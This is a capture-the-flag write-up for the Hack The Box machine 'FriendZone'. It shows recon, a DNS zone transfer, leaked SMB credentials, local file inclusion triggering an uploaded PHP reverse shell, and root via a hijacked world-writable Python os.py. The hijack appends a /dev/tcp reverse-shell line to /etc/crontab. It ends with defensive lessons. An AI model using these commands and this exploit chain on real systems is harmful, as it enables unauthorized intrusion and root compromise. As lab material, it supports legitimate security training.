# HTB: FriendZone

**Difficulty:** Easy
**OS:** Linux
**Target IP:** 10.129.62.27
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

```bash
rustscan -a 10.129.62.27
```

```
Open 10.129.62.27:21
Open 10.129.62.27:22
Open 10.129.62.27:53
Open 10.129.62.27:80
Open 10.129.62.27:139
Open 10.129.62.27:443
Open 10.129.62.27:445
```

```bash
nmap -sCV -T4 -p21,22,53,80,139,443,445 10.129.62.27 -oA nmap/nmap
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/https   Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: FRIENDZONE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

Key takeaways:
- FTP, SSH, HTTP(S), and **two** SMB ports (139/445) — Samba running on Linux, not real Windows (confirmed by `smb-os-discovery` reporting `Samba 4.7.6-Ubuntu` despite reporting a spoofed "Windows 6.1" OS string — a normal Samba compatibility quirk, not an indicator of a dual-boot or actual Windows host).
- SMB signing is **not required** and guest/null auth is supported — worth revisiting.
- The TLS certificate's Common Name — `friendzone.red` — discloses the real domain name used by the application, distinct from the raw IP.

> DNS servers (BIND included) commonly listen on **both TCP and UDP port 53** by design, since TCP is required for zone transfers and for any response too large to fit in a single UDP packet. With port 53 open, testing for a misconfigured **AXFR** zone transfer is a routine recon step against any exposed, apparently-authoritative DNS server — which is exactly what led to the useful discovery below.

---

## 2. Web Enumeration

### 2.1 Port 80

```
Have you ever been friendzoned ?
if yes, try to get out of this zone ;)
Call us at : +999999999
Email us at: info@friendzoneportal.red
```

Added `friendzoneportal.red` (from the exposed contact email's domain) to `/etc/hosts`, but this didn't lead anywhere further on its own.

### 2.2 Port 443

```html
<title>Watching you !</title>
<h2>G00d !</h2>
<img src="z.gif">
```

No further functionality on the page itself, but the TLS certificate's CN (`friendzone.red`) gave the actual working domain, which was added to `/etc/hosts` as well.

### 2.3 DNS Zone Transfer

```bash
dig axfr @10.129.62.27 friendzone.red
```

```
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
```

The zone transfer succeeded — an unrestricted `AXFR` should never be permitted from an arbitrary client, since it dumps the server's **entire DNS zone**, effectively handing over a full map of every hostname the organization uses. This leaked three subdomains that were never linked anywhere on the public site: `administrator1`, `hr`, and `uploads`.

All three resolve to `127.0.0.1` in the zone data — meaning the actual routing between hostname and content happens at the **Apache virtual-host layer** on the box itself, not via distinct DNS records. Added all three to `/etc/hosts` pointing at the real target IP.

Browsing them:
- `hr.friendzone.red` → returned a generic 404.
- `uploads.friendzone.red` → a **Fake Uploads Site** — a decoy page styled as a file upload portal, with no real upload functionality behind it.
- `administrator1.friendzone.red` → returned actual content.

> The 404 on `hr` most likely means Apache has **no `<VirtualHost>` block configured** for that name (only for `administrator1.friendzone.red` and `uploads.friendzone.red`), so requests to it either hit Apache's default/catch-all vhost or a vhost with no matching content. `uploads.friendzone.red` itself was a red herring rather than a real upload mechanism — nothing on this box suggests these subdomains are internally-restricted (e.g., no distinct IP, no auth prompt).

---

## 3. Exploitation — Foothold

### 3.1 SMB — Anonymous Access to Credentials

```bash
smbclient //10.129.62.27/general -N
```

```
smb: \> ls
  creds.txt                           N       57  Tue Oct  9 23:52:42 2018
smb: \> get creds.txt
```

```bash
cat creds.txt
```

```
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Anonymous/null SMB access to the `general` share exposed a plaintext credential file directly — `admin:WORKWORKHhallelujah@#`.

### 3.2 Logging Into the Admin Portal

Using these credentials against `https://administrator1.friendzone.red/`:

```
Login Done ! visit /dashboard.php
```

`dashboard.php` presented:

```
Smart photo script for friendzone corp !
* Note : we are dealing with a beginner php developer and the application is not tested yet !

image_name param is missed !
please enter it to show the image

default is image_id=a.jpg&pagename=timestamp
```

### 3.3 Identifying the Real Vulnerable Parameter

Testing `?image_id=a.jpg&pagename=timestamp` returned:

```
Something went worng ! , the script include wrong param !
Final Access timestamp is 1786627181
```

> The page's own hint text frames `image_id` as the "missing" parameter, but functionally it's a decoy. The parameter that actually controls server-side behavior is **`pagename`**. This was confirmed by directory brute-forcing (below), which found a real file called `timestamp.php` on disk — matching the default `pagename=timestamp` value exactly, and by the fact that the "Final Access timestamp" content only appears when `pagename=timestamp` is supplied. This indicates the backend code does something along the lines of:
>
> ```php
> include($_GET['pagename'] . ".php");
> ```
>
> — i.e., it takes the `pagename` value, appends `.php`, and includes it server-side with **no validation or sanitization** of the path. That's a classic **Local File Inclusion (LFI)** vulnerability: since `pagename` accepts arbitrary paths (including `../` traversal or absolute paths), an attacker can make the server `include()` any `.php`-suffixed file it can reach — including files an attacker has planted elsewhere on the filesystem, turning the LFI into full remote code execution once a malicious file is in place.

### 3.4 Directory Enumeration

```bash
gobuster dir -u https://administrator1.friendzone.red/ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -k -x php -t 50
```

```
images               (Status: 301) [--> https://administrator1.friendzone.red/images/]
login.php            (Status: 200)
dashboard.php        (Status: 200)
timestamp.php        (Status: 36)
```

Confirmed `timestamp.php` exists on disk — consistent with the `pagename`-based inclusion behavior identified above.

### 3.5 Mapping SMB Shares to Filesystem Paths

```bash
smbmap -H 10.129.62.27 -u '' -p '' -s general
```

```
Disk                                                    Permissions     Comment
----                                                    -----------     -------
print$                                                  NO ACCESS       Printer Drivers
Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
general                                                 READ ONLY       FriendZone Samba Server Files
Development                                             READ, WRITE     FriendZone Samba Server Files
IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

Two things stand out here:
1. **`Development` is world-writable** (`READ, WRITE`) with no authentication required — a direct path to plant a file on the server's filesystem.
2. The **`Files` share's comment literally discloses its real filesystem path** — `/etc/Files`. Since Samba share paths on this box are evidently rooted directly under `/etc/`, this strongly implies the `Development` share maps to **`/etc/Development`** on disk (i.e., each share's name mirrors a same-named directory directly under `/etc/`). This inferred path is what makes the LFI-to-RCE chain below possible — without SMB access to confirm the on-disk layout, blindly guessing the include path would have been far harder.

### 3.6 Uploading a Web Shell via SMB

```bash
smbclient //10.129.62.27/development -N
```

```
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (4.4 kB/s) (average 4.4 kB/s)
```

Uploaded a standard PHP reverse shell (pentestmonkey-style `php-reverse-shell.php`) directly into the writable `Development` share — which, per the filesystem mapping above, lands at `/etc/Development/php-reverse-shell.php`.

### 3.7 Triggering the LFI

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```

Since the backend appends `.php` automatically to the `pagename` value (as established above), supplying `/etc/Development/php-reverse-shell` (**without** the extension) causes it to resolve to and `include()` the uploaded `php-reverse-shell.php` — executing it in the context of the web server.

```bash
nc -lvnp 4444
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.62.27] 58332
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ Foothold obtained as `www-data`.

---

## 4. Privilege Escalation

### 4.1 Process Monitoring with pspy

```bash
wget http://10.10.15.146/pspy64s
```

`pspy` was used to observe scheduled/background processes **without needing root** — it works by polling `/proc` for new process IDs and their command lines, which doesn't require any special privilege since `/proc` is world-readable by default on Linux. This makes it ideal for spotting cron jobs or other periodic root-owned tasks that would otherwise be invisible to a low-privileged user.

```
2026/08/13 15:50:01 CMD: UID=0    PID=3870   | /usr/bin/python /opt/server_admin/reporter.py
2026/08/13 15:50:01 CMD: UID=0    PID=3869   | /bin/sh -c /opt/server_admin/reporter.py
2026/08/13 15:50:01 CMD: UID=0    PID=3868   | /usr/sbin/CRON -f
```

Confirmed a script, `/opt/server_admin/reporter.py`, runs **as root** via cron every 2 minutes.

### 4.2 Inspecting the Script

```bash
cat /opt/server_admin/reporter.py
```

```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com ... '''
#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

Two important details:
1. The `print "..."` statement (no parentheses) is **Python 2 syntax** — combined with the shebang `#!/usr/bin/python`, this confirms the script runs under **Python 2**, not Python 3, on this system.
2. The script does `import os` — a completely ordinary, harmless-looking standard library import. But *which* `os.py` gets loaded depends on Python's module search path, and if any directory earlier in that search path contains a file also named `os.py` and is **writable by an unprivileged user**, that file will be imported instead of the real standard library module — silently executing attacker-controlled code with whatever privilege the importing script runs as.

### 4.3 Locating a Hijackable `os.py`

```bash
find / -type f -name "os*" 2>/dev/null
```

```
/usr/lib/python3.6/os.py
/usr/lib/python2.7/os.py
```

```bash
ls -la /usr/lib/python3.6/os.py
```

```
-rw-r--r-- 1 root root 37526 Sep 12  2018 /usr/lib/python3.6/os.py
```

The **Python 3** copy is owned by root with no write access for `www-data` — a dead end.

```bash
ls -la /usr/lib/python2.7/os.py
```

```
-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
```

The **Python 2** copy, however, is **world-writable** (`777`) — and since `reporter.py` runs under Python 2 (confirmed above), this is directly exploitable: overwriting this file lets `www-data` inject arbitrary code that executes **as root** the next time cron fires `reporter.py` and it does `import os`.

### 4.4 Hijacking `os.py`

Rather than replacing the entire file with a reverse shell payload directly (which risks breaking `import os` calls elsewhere on the system and being noisy), the approach taken was to have the hijacked module **append a persistent cron job to `/etc/crontab`** the moment it gets imported — a more reliable way to get a stable, repeating callback as root:

```python
import os
f = open("/etc/crontab", "a")
f.write("* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/10.10.15.146/4443 0>&1\"\n")
f.close()
```

```bash
cp /tmp/os.py /usr/lib/python2.7/os.py
```

The next time cron invokes `reporter.py` (as root, via `/usr/bin/python`, which resolves to Python 2 on this system), the script's `import os` statement loads this malicious file instead of the real module. Its top-level code executes immediately on import — appending a new line to `/etc/crontab` that spawns a **root** reverse shell every minute, independent of `reporter.py` itself.

### 4.5 Catching the Root Shell

```bash
nc -lvnp 4443
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.62.27] 40920
bash: cannot set terminal process group (4296): Inappropriate ioctl for device
bash: no job control in this shell
root@FriendZone:~# whoami
whoami
root
```

✅ Root access obtained.

---

## 5. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → FTP, SSH, DNS, dual HTTP(S), and dual SMB (139/445) |
| Domain discovery | TLS certificate CN and a leaked contact email disclosed `friendzone.red`; unrestricted **DNS zone transfer (AXFR)** leaked three internal subdomains never linked publicly |
| Credential disclosure | Anonymous SMB access to the `general` share exposed a plaintext `creds.txt` with admin portal credentials |
| Vulnerability ID | Logged into `administrator1.friendzone.red/dashboard.php`; the `pagename` parameter (not the advertised `image_id`) drives an unsanitized server-side `include()` → **Local File Inclusion** |
| Filesystem mapping | SMB share comments (`/etc/Files`) revealed shares are rooted under `/etc/`, and `smbmap` showed `Development` was world-writable — inferred it maps to `/etc/Development` |
| Foothold | Uploaded a PHP reverse shell to the writable `Development` SMB share, then triggered it via the LFI (`pagename=/etc/Development/php-reverse-shell`) → RCE as `www-data` |
| Privilege Escalation | `pspy` revealed a root cron job importing Python's `os` module; a world-writable **Python 2** `os.py` allowed module hijacking, injecting a persistent root cron-based reverse shell |

**Root cause / lessons learned:**
- DNS zone transfers must be restricted to authorized secondary nameservers only — this alone leaked the entire internal subdomain map here.
- Credential files should never be stored in plaintext on a network share reachable via anonymous/null SMB sessions; SMB null-session access itself should be disabled unless explicitly required.
- User-supplied input must never be concatenated directly into an `include()`/`require()` path — this LFI existed purely because `pagename` was trusted without any allowlist or sanitization.
- SMB shares should follow least-privilege: a world-writable, unauthenticated share (`Development`) sitting on a production-facing server is effectively an open door for anyone who finds it.
- Never leave standard library files (or any files in a language runtime's module search path) writable by unprivileged accounts — this single `777` permission on `/usr/lib/python2.7/os.py` was the entire root cause of the privilege escalation, independent of anything else on the box. Scheduled/root-run scripts should also run with the minimum privilege actually required, rather than defaulting to root for convenience.

---

## 6. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `dig` — DNS zone transfer enumeration
- `smbclient`, `smbmap` — anonymous SMB enumeration, file retrieval, and file upload
- `gobuster` — content discovery
- PHP reverse shell (pentestmonkey-style) — initial code execution via LFI
- `pspy64` — unprivileged process monitoring for cron discovery
- Python module hijacking (`os.py`) — privilege escalation
- Netcat (`nc`) — shell handling
